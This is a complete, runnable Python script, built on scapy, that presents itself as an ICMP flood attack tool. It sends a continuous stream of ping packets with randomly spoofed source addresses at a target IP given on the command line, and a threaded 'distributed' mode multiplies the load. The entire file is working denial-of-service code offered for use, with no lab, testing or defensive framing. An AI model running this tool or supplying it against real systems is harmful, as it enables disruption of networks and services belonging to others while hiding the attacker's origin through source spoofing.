#!/usr/bin/env python

"""
ICMP Flood (Ping Flood) Attack Script
- Floods target with ICMP Echo Request packets
- Can overwhelm the target's network resources
"""

from scapy.all import *
import argparse
import time
import random
import threading
from datetime import datetime

def icmp_flood(target_ip, duration=60, packet_size=56, verbose=True):
    """
    Execute an ICMP flood attack against the target
    
    :param target_ip: Target IP address
    :param duration: Attack duration in seconds (default: 60)
    :param packet_size: Size of the ICMP packet in bytes (default: 56)
    :param verbose: Whether to print status updates (default: True)
    """
    if verbose:
        print(f"[*] Starting ICMP flood attack against {target_ip}")
        print(f"[*] Packet size: {packet_size} bytes")
        print(f"[*] Attack will run for {duration} seconds")
        print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    start_time = time.time()
    packet_count = 0
    
    # Create payload with specified size
    payload = b"X" * packet_size
    
    try:
        # Continue until duration is reached
        while time.time() - start_time < duration:
            # Create a random source IP (spoofing)
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Craft the ICMP packet
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload
            
            # Send the packet
            send(packet, verbose=0)
            packet_count += 1
            
            # Print status updates
            if verbose and packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets | Elapsed time: {elapsed:.2f}s")
                
    except KeyboardInterrupt:
        if verbose:
            print("\n[!] Attack interrupted by user")
    
    # Print final statistics
    if verbose:
        total_time = time.time() - start_time
        print(f"\n[*] Attack completed")
        print(f"[*] Total packets sent: {packet_count}")
        print(f"[*] Total time: {total_time:.2f} seconds")
        print(f"[*] Packet rate: {packet_count/total_time:.2f} packets/second")
        print(f"[*] Data sent: {(packet_count * packet_size) / (1024*1024):.2f} MB")
    
    return packet_count

def distributed_icmp_flood(target_ip, num_threads=4, duration=60, packet_size=56):
    """
    Execute a distributed ICMP flood attack using multiple threads
    
    :param target_ip: Target IP address
    :param num_threads: Number of threads to use (default: 4)
    :param duration: Attack duration in seconds (default: 60)
    :param packet_size: Size of the ICMP packet in bytes (default: 56)
    """
    print(f"[*] Starting distributed ICMP flood attack against {target_ip}")
    print(f"[*] Using {num_threads} threads")
    print(f"[*] Packet size: {packet_size} bytes")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    # Create and start threads
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(
            target=icmp_flood,
            args=(target_ip, duration, packet_size, False)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"[*] Started thread {i+1}")
    
    # Wait for all threads to finish
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"\r[*] Attack in progress: {elapsed:.2f}s / {duration}s", end="")
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Wait for threads to finish
    for i, thread in enumerate(threads):
        thread.join(1)
        print(f"[*] Thread {i+1} completed")
    
    print("\n[*] Distributed attack completed")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='ICMP Flood Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('-s', '--size', type=int, default=56, help='Packet size in bytes (default: 56)')
    parser.add_argument('-m', '--mode', choices=['single', 'distributed'], default='single', help='Attack mode (single or distributed)')
    parser.add_argument('-n', '--threads', type=int, default=4, help='Number of threads for distributed mode (default: 4)')
    
    args = parser.parse_args()
    
    # Execute attack
    if args.mode == 'single':
        icmp_flood(args.target, args.duration, args.size)
    else:
        distributed_icmp_flood(args.target, args.threads, args.duration, args.size)
